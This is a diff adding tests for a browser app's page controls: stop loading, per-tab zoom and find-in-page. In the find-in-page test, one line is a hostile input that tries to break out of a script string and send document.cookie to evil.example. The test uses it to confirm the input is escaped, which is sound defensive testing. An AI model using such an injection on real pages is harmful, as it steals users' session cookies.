@@ -1227,3 +1227,79 @@ test("a muted tab that still reports an audio stream can be discarded", async ()
   view.webContents.muted = true;
   assert.equal(api.discardTab(first.tabs[0].id), true, "muted: the user hears nothing");
 });
+
+// --- page controls a person expects from any browser: stop loading, zoom, find in page ---
+
+function pageApi() {
+  const { api } = tabApi(makeFakeClock(1_000));
+  return api;
+}
+
+test("stopLoading stops the active page and leaves the snapshot readable", async () => {
+  const api = pageApi();
+  await api.navigate("https://one.example");
+  const wc = fakeViews.at(-1).webContents;
+  let stopped = 0;
+  wc.stop = () => { stopped += 1; };
+  const snap = await api.stopLoading();
+  assert.equal(stopped, 1);
+  assert.equal(snap.page.url, "https://one.example/");
+  const none = await pageApi().stopLoading();
+  assert.equal(none.page.hasPage, false, "no page: nothing to stop and no error");
+});
+
+test("zoom steps through the usual browser levels, stays inside them, resets, and belongs to the tab", async () => {
+  const api = pageApi();
+  await api.navigate("https://one.example");
+  const wc = fakeViews.at(-1).webContents;
+  const scripts = [];
+  wc.executeJavaScript = (code) => { scripts.push(code); return Promise.resolve(null); };
+  assert.equal(api.getSnapshot().page.zoom, 1);
+  assert.equal((await api.zoom("in")).page.zoom, 1.1);
+  assert.equal((await api.zoom("in")).page.zoom, 1.25);
+  assert.equal((await api.zoom("out")).page.zoom, 1.1);
+  assert.equal((await api.zoom("reset")).page.zoom, 1);
+  for (let i = 0; i < 40; i += 1) await api.zoom("in");
+  assert.equal(api.getSnapshot().page.zoom, 5, "the top level is a ceiling");
+  for (let i = 0; i < 40; i += 1) await api.zoom("out");
+  assert.equal(api.getSnapshot().page.zoom, 0.25, "the bottom level is a floor");
+  await assert.rejects(() => api.zoom("sideways"), RangeError);
+  assert.ok(scripts.some((code) => code.includes("zoom")), "the page is actually zoomed");
+  await api.zoom("in");
+  await api.newTab();
+  assert.equal(api.getSnapshot().page.zoom, 1, "a new tab starts at 100%");
+  await api.selectTab(api.getSnapshot().tabs[0].id);
+  assert.equal(api.getSnapshot().page.zoom, 0.33, "the first tab keeps its own level");
+});
+
+test("a page that finishes loading gets the tab's zoom again", async () => {
+  const api = pageApi();
+  await api.navigate("https://one.example");
+  const wc = fakeViews.at(-1).webContents;
+  await api.zoom("in");
+  const scripts = [];
+  wc.executeJavaScript = (code) => { scripts.push(code); return Promise.resolve(null); };
+  wc.emit("did-finish-load");
+  await Promise.resolve();
+  assert.ok(scripts.some((code) => code.includes("1.1")), "zoom is reapplied after a navigation");
+});
+
+test("findInPage searches the active page for plain text, steps forward and backward, and clears", async () => {
+  const api = pageApi();
+  await api.navigate("https://one.example");
+  const wc = fakeViews.at(-1).webContents;
+  const scripts = [];
+  wc.executeJavaScript = (code) => { scripts.push(code); return Promise.resolve({ found: true, count: 3 }); };
+  assert.deepEqual(await api.findInPage("Add to cart"), { found: true, count: 3 });
+  assert.ok(scripts[0].includes(JSON.stringify("Add to cart")), "the text is one JSON string in the script");
+  await api.findInPage("Add to cart", { backwards: true });
+  assert.ok(scripts[1].includes("true"), "backwards is passed through");
+  const hostile = '"); fetch("https://evil.example/?"+document.cookie); ("';
+  await api.findInPage(hostile);
+  assert.equal(scripts[2].split(hostile).length, 1, "quotes cannot end the string and run page code");
+  for (const bad of ["", "   ", 5, null, "x".repeat(201)]) await assert.rejects(() => api.findInPage(bad), RangeError, JSON.stringify(bad));
+  await api.clearFind();
+  assert.ok(scripts.at(-1).includes("removeAllRanges"));
+  wc.executeJavaScript = () => Promise.reject(new Error("page gone"));
+  assert.deepEqual(await api.findInPage("x"), { found: false, count: 0 }, "a page that cannot run scripts finds nothing instead of throwing");
+});
